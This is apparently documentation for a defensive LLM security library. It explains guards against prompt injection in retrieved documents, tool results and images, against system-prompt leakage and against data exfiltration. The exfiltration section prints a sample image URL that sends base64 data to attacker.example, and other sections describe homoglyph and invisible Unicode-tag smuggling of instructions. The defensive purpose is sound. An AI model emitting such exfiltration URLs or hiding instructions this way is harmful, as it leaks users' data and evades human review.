# The guards

Every check the pipeline runs, one section each: ingestion-time scanning, non-text input, the canary, streaming output, side-channel exfiltration, and invisible-codepoint smuggling.

[← Back to README](../README.md)

## Ingestion-time scanning (`IngestGuard`)

`pre_process_external` scans retrieved content at query time, which is the
right last line of defence and the wrong place to catch poisoning. By then
the malicious chunk is indexed, returned for every similar query, and
rescanned on every retrieval — and retrieval-time scanning only ever sees
the top-k that came back, so a document planted months ago and surfacing
for one specific question is never examined until the day it works.

```python
verdict = await pipeline.ingest_document(
    page_text, document_id="wiki:1024", source_id="scraped:example.com", trust="untrusted",
)
if verdict.accepted:
    index.add(page_text, metadata={"document_id": "wiki:1024"})
else:
    review_queue.put(verdict)          # "quarantine" or "reject"
```

Three things this adds over running the sanitizer earlier by hand. It
produces a **verdict** (accept / quarantine / reject) rather than
sanitizing and continuing, because at ingest nothing is waiting on the
answer. It applies **trust tiers**, so a curated wiki and a scraped forum
thread are not held to one threshold — the untrusted tier quarantines on a
single injection phrase, which would be far too twitchy at runtime and is
close to free at ingest. And it records **provenance**:

```python
check = await pipeline.verify_retrieved(chunk_text, document_id="wiki:1024")
if check.tampered:      # content changed since it was approved
    ...
```

That last one catches what scanning cannot: content that was clean when
indexed and was modified afterwards, in the vector store, by someone who
already has write access to it. It needs a `ProvenanceStore`, and all
three ready-made backends provide one — Redis, PostgreSQL and MySQL — with
`InMemoryProvenanceStore` for a single process and a three-method
interface for anything else. It is not defaulted to in-memory on purpose:
a provenance store that forgets on restart turns verified retrievals into
unverified ones with nothing failing.

Provenance rows are the one piece of state here without a TTL. Every other
table is an expiring counter; a provenance record has to outlive whatever
session retrieved the document, because an expired record is
indistinguishable from a document that was never scanned. Deleting one
belongs with deleting the document from your index.

Batch ingestion (`ingest_batch`) parallelizes scanning across the process
pool on the same terms as `pre_process_external_batch`.

## Tool results

`authorized_tool_call` checks the arguments on the way out (for URLs that
would exfiltrate) and, by default, **the return value on the way back**. A
tool that fetches a web page returns the web page, and the web page is the
indirect-injection surface this library exists for; the arguments being
clean says nothing about it.

Every string in the result, however nested, goes through the same path a
RAG chunk takes — lexical scan, detectors, audit as
`external_content_scan` with `source_id="tool:<action>"`, session risk
charged — and a result that trips the threshold raises `ToolResultBlocked`
carrying the scan and the raw output, for a caller that wants to log it or
show it to the user without handing it to the model. The call itself is
audited as *allowed*: it was, and it ran; what is refused is feeding its
output onward. Shadow mode returns the result and records `would_block`.
`scan_tool_results=False` turns it off.

This is detection in front of the structural defence, not instead of it:
put the result through `wrap_as_data` when you build the prompt.

## Non-text input (`MediaScanner`)

Each extractor is bounded by `extractor_timeout_seconds` (30 s): one that
hangs — an OCR model that never returns, a decoder in a loop on a crafted
file — is reported in `extractor_errors` and the others still count. A
synchronous extractor cannot be interrupted, so its thread keeps running
after the timeout; the scan just stops waiting for it.

Payloads over `max_payload_bytes` (32 MB) are refused before any extractor
runs and reported `oversized`, for the reason the text scanners refuse
oversized input: a partial scan reported clean is a bypass with an address.

No OCR engine is bundled, and that is a considered choice rather than a
gap left for later. Tesseract would add tens of megabytes and a per-image
CPU cost, and would still miss the low-contrast, rotated and stylised text
this attack actually uses — producing a guard that reports "clean" on
exactly the inputs it is least able to read. That is worse than no guard,
because it is a guard people trust.

So extraction is yours and scoring is ours:

```python
scanner = MediaScanner(extractors=[
    BinaryStringsExtractor(),                      # bundled, no dependencies
    ExifExtractor(),                               # bundled, needs [images]
    CallableExtractor("vision", my_vision_client), # yours
])
result = await pipeline.pre_process_media(image_bytes, "image/png", "upload:42", session_id=sid)
```

Synchronous extractors run on a thread pool rather than on the event loop
— including a synchronous callable wrapped in `CallableExtractor`, which
is async on the outside and would otherwise stall every other request in
the process while it decodes. Pass `executor=` to bound how many images
are decoded at once. Anything an extractor returns goes through the
ordinary sanitizer, scores on the same scale, and feeds the same
cumulative session risk — so an
attack split across a message and an image does not get two independent
budgets. A failing extractor is recorded in `extractor_errors` and the
others still run; a scan where everything failed reports 0.0 *with the
errors attached*, because "nothing was read" and "nothing was there" must
not look alike.

## Canary

The overlap heuristic has two failure modes pulling opposite ways: it fires
on a system prompt written in ordinary words, and it misses when the model
paraphrases instead of quoting. A canary sidesteps both.

```python
pipeline = SecurityPipeline(system_prompt=SYSTEM_PROMPT, canary=True)
response = await model(system=pipeline.planted_system_prompt, ...)  # not SYSTEM_PROMPT
```

It is an unguessable string planted in the prompt with a line telling the
model it is meaningless. Its appearance in the output is not evidence of a
leak — it *is* the leak, and it is treated as a secret category, so it
blocks and redacts through exactly the same path a credential does,
including mid-stream. It still does not catch paraphrase (nothing lexical
does), but it turns verbatim leakage from a probability into a certainty
at zero cost. The only way to get it wrong is to send the original prompt
instead of the planted one, which is why the pipeline exposes the planted
one by name.

## Every input surface, the same checks

A detector registered on the pipeline runs on typed messages
(`pre_process`), retrieved content (`pre_process_external`), tool results
(above), and the text recovered from a media payload
(`pre_process_media`) — where it matters most, since a document is
paraphrased prose written to be read. The media scanner also judges
against the pipeline's `input_risk_threshold`, not a default of its own.
`MediaScanResult.risk_score` stays the lexical score and
`combined_risk_score` is what the decision was taken on, as on
`PreProcessResult`.

## Cross-tenant identifiers in the output

The library cannot know whose email is whose; the application can. Pass
`foreign_identifiers=` — given the principal a response is for, return the
identifiers (emails, account numbers, names) that belong to *other*
principals — and give `post_process` and `guard_stream` the `principal`.
Anything returned is matched as a secret category
(`cross_tenant_identifier`), so it blocks and redacts through the same path
a credential does, buffered or streamed. The resolver may be sync or
async, and is called once per response — if it queries a database,
cache inside it. Literals shorter than four characters are dropped: an identifier
that short is a substring of ordinary words, not something a guard can
police.

## Mixed-script homoglyphs

`ignоre` with a Cyrillic о matches no English pattern and reads identically
to a person. NFKC does not fold it, and should not: they are different
letters. What is detectable is the *mix* — a word that is Latin except for
one or two letters from another script is not a word in any language. So
script-confusable letters are folded only inside mixed-script words before
pattern matching (a pure Cyrillic or Greek sentence is left alone; that is
just Russian, or Greek), and the fold is itself a signal weighted like an
encoded payload: nobody types a mixed-script word by accident.
`SanitizationResult.homoglyph_hits` reports the count.

## Ingest in shadow mode

The pipeline's shadow mode now covers ingest. The real verdict is computed
and reported in `IngestVerdict.would_decide`, audited and counted as
`would_block_total{stage="ingest"}`, but the document is recorded as
accepted: nothing is quarantined, every document stays retrievable, the
review queue stays empty. A dry run of the ingest thresholds on a real
corpus, the way shadow mode is a dry run of the request thresholds on real
traffic. Turn it off before trusting the queue.

## Reviewing quarantined documents

"Quarantine" used to be a verdict with nowhere to go. `review_queue()`
lists quarantined documents oldest first; `approve_document(id)` and
`reject_document(id)` write the decision over the provenance record, so
the next `verify_retrieved` sees it — approving is what makes a document
retrievable. Both are audited as `ingest_review`. Backed by the provenance
store on every backend; Redis keeps a per-decision sorted set so the queue
does not scan every record.

## System-prompt overlap, measured over distinctive tokens

The overlap score is the fraction of the system prompt's *distinctive*
tokens found in the output — everything the tokenizer finds minus function
words (a small multilingual list) and one- and two-character fragments. A
prompt written as ordinary prose is mostly "you", "are", "the", and a
bag-of-words ratio against it fires on half the replies a model will ever
produce. Names, terms and identifiers are what would only appear in a
reply if the prompt had been reproduced, and they tend to survive
paraphrase and translation, so this still catches partial leakage. A
prompt with no distinctive tokens scores 0.0 rather than a meaningless
ratio; the canary is the tool for that prompt. The streaming guard uses
the same token set, so streamed and buffered scores agree.

## Streaming output

`post_process` needs the finished response. Almost every deployed chat
surface streams instead, and a guard that only works on a complete response
is a guard that gets skipped, so the output guard also runs incrementally:

```python
guarded = pipeline.guard_stream(model_stream)
async for chunk in guarded:
    await websocket.send(chunk)
if guarded.blocked:
    await websocket.replace(guarded.replacement_text)
```

It is async-iterable rather than an async generator function because the
verdict has to survive the loop: a generator that has finished has nowhere
to put "and it was blocked", which is exactly what a caller who has been
forwarding chunks needs to know afterwards. The refusal is deliberately not
yielded as a final chunk — appending it would leave the offending text
above it on screen. Replacing the message is the caller's job, and nothing
here can do it for them.

Three problems, and only the first is obvious.

**A secret can straddle a chunk boundary.** `sk-ant-abc` arrives, then
`def123`; neither half matches alone. So the scan runs over a window — the
unemitted buffer plus the tail of what was already emitted — not over the
chunk.

**Emitted text cannot be recalled**, and this shapes everything. The guard
holds back the most recent `holdback_chars` (256 by default) and releases
only what lies behind that line, so a pattern that fits inside the
hold-back is always seen whole *before* any of it is emitted. The cost is
paid in perceived latency: the user trails the model by a few hundred
characters. That is the trade, which is why it is a knob.

**A verdict on a prefix is not a verdict.** The system-prompt overlap score
is a ratio over the whole response; three tokens in it is noise, and acting
on it would block answers for starting with a word from the system prompt.
So overlap waits for `min_chars_for_overlap`. A credential match needs no
such caution — it means the same thing on a prefix as on a whole.

**The limit that cannot be engineered away.** A match longer than the
hold-back has already had its first characters emitted by the time it is
recognizable. The guard still detects it, because the detection tail is
sized independently of the hold-back — deliberately, since tying them
together would mean lowering the hold-back for latency silently stops
detecting long credentials rather than reporting a partial leak — and
reports `leaked_before_holdback=True`, which is a different incident from a
clean block and is logged as one. Keep `holdback_chars` above the longest
credential your patterns can match and it does not arise; the default
clears every pattern shipped with the library.

[The CPU cost is per chunk, not per character: every `feed` rescans the
window (detection tail plus buffer), so a stream fed one token at a time
costs roughly window-size times more than a buffered scan of the same
text. `guard_stream` therefore coalesces chunks up to `min_chunk_chars`
(48) before feeding; the hold-back already delays emission by more than
that, so the user sees nothing different. There is a second benefit: a
token-sized feed gives the detector less context than the hold-back can
cover, and a long credential can leak its prefix; batched, the same stream
blocks with nothing emitted. Off in shadow mode, where timing must be
exactly the model's. Using `StreamingOutputGuard` directly, batch before
feeding.

[Shadow mode](detection-and-tuning.md#shadow-mode) changes neither content nor timing: the hold-back is switched
off, chunks are forwarded exactly as they arrive, and `would_block` records
what enforcement would have done. Observing a stream must not make it feel
slower than the stream being measured.

## Side-channel exfiltration (`ExfilGuard`)

The output guard redacts secrets it recognises. That does nothing about a
model — following an instruction injected into a retrieved page — encoding
data the user is entitled to see into a URL the client fetches on render:

```
![](https://attacker.example/p.png?d=c2stbGl2ZS1hYmMxMjM)
```

No click, nothing visible in the conversation, and the payload arrives in
the attacker's access log. `ExfilGuard` classifies every URL it finds by
two properties: whether the renderer fetches it without user action
(images, iframes, media sources, `srcset`, `poster`, CSS `url()`) and
whether it is shaped like it is carrying data (long or high-entropy
path/query segments, base64/hex blobs, embedded credentials, `data:`
URIs). Auto-fetch plus a payload shape blocks the response; a
click-required link with a payload shape has its destination stripped and
the message kept. `neutralized_text` always has the suspicious URLs
removed, so a caller that ignores `blocked` still gets the mitigation.

It runs by default. Give it an allowlist to make it a real control:

```python
pipeline = SecurityPipeline(
    exfil_allowed_hosts=["cdn.mycorp.com", "mycorp.com"],  # subdomains included
)
```

Without one, the guard has to infer intent from URL shape, and `?w=800` on
a CDN image is not distinguishable from a one-character channel. With one,
any auto-fetching URL pointing elsewhere is a finding regardless of shape
— the only version of this defence that holds against an attacker who
pads the payload to look ordinary.

Tool-call arguments are scanned too, on the same rules: an agent talked
into `http_get(url=...)` exfiltrates just as well as one that emits an
image tag, and that path never reaches `post_process`.

The two integration points have separate switches, both defaulting on,
because they differ in blast radius — one rewrites a reply, the other
refuses an action:

```python
SecurityPipeline(
    scan_output_for_exfil=False,      # leave generated text alone
    scan_tool_call_arguments=False,   # leave tool arguments alone
)
```

With output scanning off, `PostProcessResult.exfil` is `None` and the text
is passed through as the output guard left it; secret redaction is
unaffected.

## Invisible-codepoint smuggling

Every printable ASCII character has a counterpart in the Unicode Tags
block (U+E0000–U+E007F) that renders as nothing and passes through NFKC
untouched. An entire instruction can therefore sit inside a string that
looks ordinary to whoever reviews it and tokenizes normally for the model.
`normalize_text` now strips the block, and the sanitizer decodes the
hidden run first and puts it through the same lexical scan as visible
text, so `[hidden] <pattern>` shows up in `matched_patterns` and the
decoded message is preserved in `hidden_text_hits` for the audit trail.

The presence of hidden text scores as heavily as an encoded payload and is
deliberately not conditioned on what it says: text written to be
unreadable by the human in the loop is hostile by construction. Bidi
overrides (U+202D/U+202E) are stripped and scored; embeddings and isolates
are stripped silently, since they occur in ordinary mixed RTL/LTR text,
as do the variation selectors used for emoji presentation.
